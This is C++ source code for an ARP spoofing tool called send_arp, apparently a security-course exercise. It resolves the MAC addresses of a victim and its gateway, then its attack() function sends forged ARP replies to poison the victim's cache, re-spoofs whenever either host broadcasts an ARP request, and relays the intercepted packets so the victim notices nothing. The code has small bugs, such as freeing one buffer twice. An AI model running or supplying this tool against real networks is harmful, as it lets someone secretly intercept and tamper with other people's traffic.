#include "arp.h"

void usage()
{
    printf("\nusage   : send_arp <interface> <sender ip> <target ip> [<sender ip> <target ip> ...]");
    printf("\nexample : send_arp eth0 192.168.0.11 192.168.0.1\n\n");
}

void print_mac(const char *msg, uint8_t* mac)
{
    printf("[+]Success to get %s's MAC address..\n", msg);
    printf("MAC : %02X:%02X:%02X:%02X:%02X:%02X\n",mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

int GetSvrMacAddress(Address_info *addressinfo)
{
    int nSD; // Socket descriptor
    struct ifreq *ifr; // Interface request
    struct ifconf ifc;
    char ipstr[40];
    uint32_t tmpIP, numif, i;

    memset(&ifc, 0, sizeof(ifc));
    ifc.ifc_ifcu.ifcu_req = nullptr;
    ifc.ifc_len = 0;

    // Create a socket that we can use for all of our ioctls
    nSD = socket( PF_INET, SOCK_DGRAM, 0 );
    if ( nSD < 0 )  return 0;
    if(ioctl(nSD, SIOCGIFCONF, &ifc) < 0) return 0;
    if ((ifr = reinterpret_cast<ifreq*>(malloc(ifc.ifc_len))) == nullptr)
        return 0;
    else
    {
        ifc.ifc_ifcu.ifcu_req = ifr;
        if (ioctl(nSD, SIOCGIFCONF, &ifc) < 0)
            return 0;

        numif = ifc.ifc_len / sizeof(struct ifreq);

        for (i = 0; i < numif; i++)
        {
            struct ifreq *r = &ifr[i];

            if (!strcmp(r->ifr_name, addressinfo->interface))
            {
                inet_ntop(AF_INET, r->ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
                tmpIP = inet_addr(ipstr);
                memcpy(addressinfo->hostIP, &tmpIP , IP_ADDR_LEN);
                if(ioctl(nSD, SIOCGIFHWADDR, r) < 0)
                {
                    if(nSD) close(nSD);
                    if(ifr) free(ifr);
                    return 0;
                }
                memcpy(addressinfo->hostMac, r->ifr_hwaddr.sa_data, 6);
                if(nSD) close(nSD);
                if(ifr) free(ifr);
                return 1;
            }
        }
    }
    close(nSD);
    free(ifr);

    return( 0 );
}

int GetTargetMacAddress(Address_info *addressinfo)
{
    ARP_Packet *arpPacketToSender;
    ARP_Packet *arpPacketToTarget;
    char errbuf[PCAP_ERRBUF_SIZE];

    arpPacketToSender = reinterpret_cast<ARP_Packet*>(malloc(sizeof(ARP_Packet)));
    arpPacketToTarget = reinterpret_cast<ARP_Packet*>(malloc(sizeof(ARP_Packet)));

    SetARPPacket(arpPacketToSender, ARP_REQUEST, addressinfo, SENDER);
    SetARPPacket(arpPacketToTarget, ARP_REQUEST, addressinfo, TARGET);

    pcap_t* handle = pcap_open_live(addressinfo->interface, BUFSIZ, 1, 1, errbuf);
    if(handle == nullptr)
    {
        printf("[-] Error! Can't open %s's handle!\n",addressinfo->interface);
        return 0;
    }
    pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacketToSender), ARP_PACKET_SIZE);
    pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacketToTarget), ARP_PACKET_SIZE);

    int retry = 0;
    int flag = 0;
    const int threshhold = 1000;
    while (true)
    {
        retry++;
        struct pcap_pkthdr* header;
        const u_char* packet;
        const ARP_Packet *p;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        p = reinterpret_cast<const ARP_Packet*>(packet);
        if(p->ETH_TYPE == htons(0x0806))
        {
            if(memcmp(addressinfo->targetIp ,p->SRC_IP_ADDR, IP_ADDR_LEN) == 0)
            {
                memcpy(addressinfo->targetMac, p->SRC_MAC_ADDR, MAC_ADDR_LEN);
                flag |= 0x1;
            }
            else if(memcmp(addressinfo->senderIp ,p->SRC_IP_ADDR, IP_ADDR_LEN) == 0)
            {
                memcpy(addressinfo->senderMac, p->SRC_MAC_ADDR, MAC_ADDR_LEN);
                flag |= 0x2;
            }
        }
        if (flag == 3)
            break;
        else if(retry > threshhold)
        {
            free(arpPacketToSender);
            free(arpPacketToSender);
            pcap_close(handle);
            return 0;
        }
        else if(retry % 30 == 0)
        {
            pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacketToSender), ARP_PACKET_SIZE);
            pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacketToTarget), ARP_PACKET_SIZE);
        }
    }
    free(arpPacketToSender);
    free(arpPacketToTarget);
    pcap_close(handle);
    return 1;
}


void SetARPPacket(ARP_Packet *packet, uint16_t opcode, Address_info *addressinfo, int isTarget)
{
    packet->ETH_TYPE = htons(0x0806);
    packet->HW_TYPE = htons(0x01);
    packet->PROTOCOL_TYPE = htons(0x0800);
    packet->HW_ADDR_LEN = 6;
    packet->PROTO_ADDR_LEN = 4;
    packet->OPCODE = htons(opcode);

    switch(opcode)
    {
    case ARP_REQUEST:
        memcpy(packet->ETH_SRC, addressinfo->hostMac, MAC_ADDR_LEN);
        memset(packet->ETH_DST, 0xff, MAC_ADDR_LEN);
        memcpy(packet->SRC_MAC_ADDR, addressinfo->hostMac, MAC_ADDR_LEN);
        memcpy(packet->SRC_IP_ADDR, &addressinfo->hostIP, IP_ADDR_LEN);
        memset(packet->DST_MAC_ADDR, 0x00, MAC_ADDR_LEN);
        if(isTarget)
            memcpy(packet->DST_IP_ADDR, &addressinfo->targetIp, IP_ADDR_LEN);
        else
            memcpy(packet->DST_IP_ADDR, &addressinfo->senderIp, IP_ADDR_LEN);
        break;
    case ARP_REPLY:
        memcpy(packet->ETH_SRC, addressinfo->hostMac, MAC_ADDR_LEN);
        memcpy(packet->ETH_DST, addressinfo->senderMac, MAC_ADDR_LEN);
        memcpy(packet->SRC_MAC_ADDR, addressinfo->hostMac, MAC_ADDR_LEN);
        memcpy(packet->SRC_IP_ADDR, &addressinfo->targetIp, IP_ADDR_LEN);
        memcpy(packet->DST_MAC_ADDR, addressinfo->senderMac, MAC_ADDR_LEN);
        memcpy(packet->DST_IP_ADDR, &addressinfo->senderIp, IP_ADDR_LEN);
        break;
    }
}

void attack(Address_info *addressinfo)
{
    ARP_Packet *arpPacket;
    char errbuf[PCAP_ERRBUF_SIZE];

    arpPacket = reinterpret_cast<ARP_Packet*>(malloc(sizeof(ARP_Packet)));
    SetARPPacket(arpPacket, ARP_REPLY, addressinfo);

    pcap_t* handle = pcap_open_live(addressinfo->interface, BUFSIZ, 1, 1, errbuf);
    pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacket), ARP_PACKET_SIZE);

    while (true)
    {
        struct pcap_pkthdr* header;
        const u_char* packet;
        Eth_header *eth;
        const ARP_Packet *arp;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        eth =const_cast<Eth_header*>(reinterpret_cast<const Eth_header*>(packet));
        arp = reinterpret_cast<const ARP_Packet*>(packet);

        //case 1. Re-Spoofing
        if ( eth->eth_type == htons(0x0806))
        {
            // target broadcast to find sender
            if( memcmp(eth->eth_src, &addressinfo->targetMac,    MAC_ADDR_LEN) == 0 &&
                memcmp(eth->eth_dst, "\xff\xff\xff\xff\xff\xff", MAC_ADDR_LEN) == 0 )
            {
                printf("ARP from target detected!!! Trying Re-Spoofing..");
                pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacket), ARP_PACKET_SIZE);
                printf("Done!!\n");
            }
            // sender broadcast or unicast to find target
            else if ( memcmp(arp->DST_IP_ADDR, &addressinfo->targetIp , IP_ADDR_LEN ) == 0 &&
                      memcmp(eth->eth_src,     &addressinfo->senderMac, MAC_ADDR_LEN) == 0)
            {
                printf("ARP from sender detected!!! Trying Re-Spoofing..");
                pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacket), ARP_PACKET_SIZE);
                pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacket), ARP_PACKET_SIZE);
                usleep(100);
                pcap_sendpacket(handle, reinterpret_cast<u_char*>(arpPacket), ARP_PACKET_SIZE);
                printf("Done!!\n");
            }
        }

        //case 2. Relay
        else if(memcmp(eth->eth_src, addressinfo->senderMac, MAC_ADDR_LEN) == 0)
        {
            printf("Packet from sender detected!!! packet size : %d Trying Relay..", header->len);
            memcpy(eth->eth_dst, addressinfo->targetMac, MAC_ADDR_LEN);
            memcpy(eth->eth_src, addressinfo->hostMac, MAC_ADDR_LEN);
            pcap_sendpacket(handle, packet, header->len);
            printf("Done!!\n");
        }
        else
            continue;

    }
    free(arpPacket);
    pcap_close(handle);
}
